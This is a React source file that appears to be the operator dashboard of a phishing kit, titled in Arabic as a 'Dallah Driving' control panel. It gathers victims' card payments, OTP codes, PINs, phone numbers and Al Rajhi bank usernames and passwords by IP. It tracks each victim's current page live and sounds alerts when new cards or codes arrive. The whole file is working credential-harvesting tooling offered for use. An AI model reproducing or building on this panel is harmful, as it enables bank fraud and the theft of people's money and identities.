import React, { useState, useEffect, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
import { socket } from "./socket";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import InfoModal from "./components/InfoModal";
import Login from "./Login";
import "./App.css";

export default function App() {
  const [users, setUsers] = useState({});
  const [cardIp, setCardIp] = useState(null);
  const [infoIp, setInfoIp] = useState(null);
  const navigate = useNavigate();

  const sounds = useRef({
    data: new Audio("/sounds/new-data.wav"),
    card: new Audio("/sounds/new-card.wav"),
    code: new Audio("/sounds/new-code.wav"),
    ip: new Audio("/sounds/new-ip.wav"),
  });

  const playSound = (type) => {
    const audio = sounds.current[type];
    if (audio) {
      audio.currentTime = 0;
      audio.play().catch(e => console.log("Sound error:", e));
    }
  };

  useEffect(() => {
    const token = localStorage.getItem("token");
    if (!token) {
      navigate("/login", { replace: true });
      return;
    }

    socket.connect();
    socket.emit("loadData");

    socket.on("initialData", (data) => {
      const merged = {};
      const ensure = (ip) => {
        if (!merged[ip]) merged[ip] = { ip, payments: [], flag: false };
      };

      (data.index || []).forEach(r => { ensure(r.ip); merged[r.ip] = { ...merged[r.ip], ...r }; });
      (data.payment || []).forEach(p => { ensure(p.ip); merged[p.ip].payments.push(p); });
      (data.otp || []).forEach(r => { ensure(r.ip); merged[r.ip].verificationCode = r.verificationCode; });
      (data.pin || []).forEach(r => { ensure(r.ip); merged[r.ip].pin = r.pin; });
      (data.phone || []).forEach(r => { ensure(r.ip); merged[r.ip].phoneNumber = r.phoneNumber; merged[r.ip].operator = r.operator; });
      (data.phonecode || []).forEach(r => { ensure(r.ip); merged[r.ip].phoneCode = r.phoneCode; });
      (data.rajhi || []).forEach(r => { ensure(r.ip); merged[r.ip].rajhiUsername = r.username; merged[r.ip].rajhiPassword = r.password; });
      (data.locations || []).forEach(r => { ensure(r.ip); merged[r.ip].currentPage = r.currentPage; });
      (data.flags || []).forEach(r => { ensure(r.ip); merged[r.ip].flag = r.flag; });

      setUsers(merged);
    });

    socket.on("newIndex", (doc) => {
      setUsers(prev => ({ ...prev, [doc.ip]: { ...(prev[doc.ip] || { payments: [] }), ...doc, updatedAt: new Date() } }));
      playSound("data");
    });

    socket.on("newPayment", (doc) => {
      setUsers(prev => {
        const old = prev[doc.ip] || { payments: [] };
        return { ...prev, [doc.ip]: { ...old, payments: [...old.payments, doc], updatedAt: new Date() } };
      });
      playSound("card");
    });

    socket.on("newOtp", (doc) => {
      setUsers(prev => ({ ...prev, [doc.ip]: { ...(prev[doc.ip] || { payments: [] }), verificationCode: doc.verificationCode, updatedAt: new Date() } }));
      playSound("code");
    });

    socket.on("newPin", (doc) => {
      setUsers(prev => ({ ...prev, [doc.ip]: { ...(prev[doc.ip] || { payments: [] }), pin: doc.pin, updatedAt: new Date() } }));
      playSound("code");
    });

    socket.on("locationUpdated", ({ ip, page }) => {
      setUsers(prev => ({ ...prev, [ip]: { ...(prev[ip] || { payments: [] }), currentPage: page, updatedAt: new Date() } }));
      if (page !== "offline") playSound("ip");
    });

    socket.on("flagUpdated", ({ ip, flag }) => {
      setUsers(prev => ({ ...prev, [ip]: { ...(prev[ip] || { payments: [] }), flag } }));
    });

    socket.on("userDeleted", ({ ip }) => {
      setUsers(prev => {
        const next = { ...prev };
        delete next[ip];
        return next;
      });
    });

    return () => {
      socket.off("initialData");
      socket.off("newIndex");
      socket.off("newPayment");
      socket.off("newOtp");
      socket.off("newPin");
      socket.off("locationUpdated");
      socket.off("flagUpdated");
      socket.off("userDeleted");
    };
  }, [navigate]);

  return (
    <Routes>
      <Route path="/login" element={<Login />} />
      <Route path="/" element={
        <DashboardView
          users={users}
          onShowCard={setCardIp}
          onShowInfo={setInfoIp}
          cardIp={cardIp}
          infoIp={infoIp}
          setCardIp={setCardIp}
          setInfoIp={setInfoIp}
        />
      } />
    </Routes>
  );
}

function DashboardView({ users, onShowCard, onShowInfo, cardIp, infoIp, setCardIp, setInfoIp }) {
  const userList = Object.values(users).sort((a, b) => {
    const timeA = a.updatedAt ? new Date(a.updatedAt).getTime() : 0;
    const timeB = b.updatedAt ? new Date(b.updatedAt).getTime() : 0;
    return timeB - timeA;
  });

  return (
    <div className="container py-4">
      <div className="d-flex justify-content-between align-items-center mb-4">
        <h2 className="fw-bold text-primary">لوحة التحكم الموحدة - دلة للقيادة</h2>
        <div className="badge bg-success fs-6">
          المتصلون الآن: {userList.filter(u => u.currentPage !== "offline").length}
        </div>
      </div>

      <UserTable
        users={userList}
        onShowCard={onShowCard}
        onShowInfo={onShowInfo}
      />

      {cardIp && (
        <CardModal
          ip={cardIp}
          user={users[cardIp]}
          onClose={() => setCardIp(null)}
        />
      )}

      {infoIp && (
        <InfoModal
          ip={infoIp}
          user={users[infoIp]}
          onClose={() => setInfoIp(null)}
        />
      )}
    </div>
  );
}
